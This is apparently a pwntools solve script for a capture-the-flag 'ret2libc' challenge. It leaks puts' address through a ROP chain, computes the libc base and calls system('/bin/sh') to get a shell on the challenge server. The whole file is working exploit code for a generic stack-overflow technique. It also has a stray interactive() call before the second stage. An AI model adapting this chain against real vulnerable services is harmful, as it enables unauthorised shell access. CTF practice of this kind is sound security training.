from pwn import *
import argparse 
from time import sleep

def main():
    args = parsing()

    if args.local:
        proc = process("ret2libc")
    else:
        proc = remote("nc.ctf.unitedctf.ca", 4002)
    if args.debug:
        gdb.attach(proc, "b main")

    print(proc.recvuntil(b"> ").strip().decode())
    
    rop = chain() 
    print("--> Sending ROP chain:", rop)
    proc.sendline(rop)

    puts_leak = proc.recvline().strip()
    print("--> Leak puts: ", puts_leak)

    print(proc.recvuntil(b"> ").strip().decode())

    proc.interactive()

    rop = chain2(u64(puts_leak+b"\x00\x00")) 
    print("--> Sending ROP chain:", rop)
    proc.sendline(rop)

    #gdb.attach(proc, "b *main+55")

    proc.interactive()


def chain():
    # ret2plt ret2main
    b = ELF("ret2libc")
    puts = b.symbols['puts']
    got_puts = b.symbols['got.puts']
    main = b.symbols['main']

    rdi = 0x000000000040082b
    rsi_r15 = 0x0000000000400829
    
    rop = b""
    rop += b"A"*0x28 
    rop += p64(rdi)
    rop += p64(got_puts)
    rop += p64(puts)
    rop += p64(main)

    return rop

def chain2(puts_leak):
    # ret2libc

    libc = ELF("libc-2.27.so")

    base = puts_leak - libc.symbols['puts'] 
    system = base + libc.symbols['system']
    binsh = base + next(libc.search(b'/bin/sh\x00'))

    rdi = 0x000000000040082b
    rsi_r15 = 0x0000000000400829
    
    rop = b""
    rop += b"A"*0x28 
    rop += p64(rdi)
    rop += p64(binsh)
    rop += p64(system)

    return rop

def parsing():
    parser = argparse.ArgumentParser(description='Parse args')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true',
                    help='Active debug mode')
    parser.add_argument('-l', '--local', dest='local', action='store_true',
                    help='Start local process')
    return parser.parse_args()

if __name__ == "__main__":
    main()
